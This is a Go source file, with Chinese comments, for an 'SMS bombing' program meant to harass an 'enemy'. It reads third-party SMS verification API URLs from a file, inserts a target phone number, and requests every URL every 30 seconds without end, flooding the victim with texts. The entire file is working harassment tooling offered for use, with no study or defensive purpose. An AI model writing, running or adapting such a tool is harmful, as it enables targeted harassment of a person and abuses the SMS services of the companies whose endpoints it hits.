// 惩恶扬善 短信轰炸程序
// higkers@gmail.com
package main

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/signal"
	"syscall"
	"time"
)

var (
	// 仇人手机号 可以直接改成字符串
	phone = os.Getenv("test_phone")
	// 收集短信接口
	apiList []string = make([]string, 0, 1000)
	format           = "2006-01-02 15:04:05"
	count            = 1
	banner           = " ____                        __                      \n" +
		"/\\  _`\\                     /\\ \\                     \n" +
		"\\ \\ \\L\\ \\    ___     ___ ___\\ \\ \\____     __   _ __  \n" +
		" \\ \\  _ <'  / __`\\ /' __` __`\\ \\ '__`\\  /'__`\\/\\`'__\\\n" +
		"  \\ \\ \\L\\ \\/\\ \\L\\ \\/\\ \\/\\ \\/\\ \\ \\ \\L\\ \\/\\  __/\\ \\ \\/ \n" +
		"   \\ \\____/\\ \\____/\\ \\_\\ \\_\\ \\_\\ \\_,__/\\ \\____\\\\ \\_\\ \n" +
		"    \\/___/  \\/___/  \\/_/\\/_/\\/_/\\/___/  \\/____/ \\/_/ \n" +
		"                                                     "
)

func init() {
	// 加载抓包到的api
	loadData()
}

func main() {
	//合建chan
	channel := make(chan os.Signal)
	//监听指定信号 ctrl+c kill
	signal.Notify(channel, os.Interrupt, os.Kill, syscall.SIGUSR1, syscall.SIGUSR2)
	fmt.Println(banner)
	fmt.Println("[INFO] 开始:", phone, "bom bom...")
	go func() {
		for {
			for _, url := range apiList {
				// 比较消耗网络资源
				go http.Get(url)
			}
			fmt.Println("[INFO]", time.Now().Format(format), "第", count, "轮执行完成.")
			count++
			// 间隔时间可自定义 30s
			time.Sleep(30 * time.Second)
		}
	}()
	<-channel
}

// func bomb(url string) {
// 	//fmt.Println(url)
// 	r, err := http.Get(url)
// 	if err == nil {
// 		r.Body.Close()
// 	}
// }

func loadData() {
	fe, err := os.Open("./api.txt")
	if err != nil {
		fmt.Println(err)
		return
	}
	defer fe.Close()
	buf := bufio.NewReader(fe)
	for {
		a, _, c := buf.ReadLine()
		if c == io.EOF {
			break
		}
		apiList = append(apiList, fmt.Sprintf(string(a), phone))
	}
}
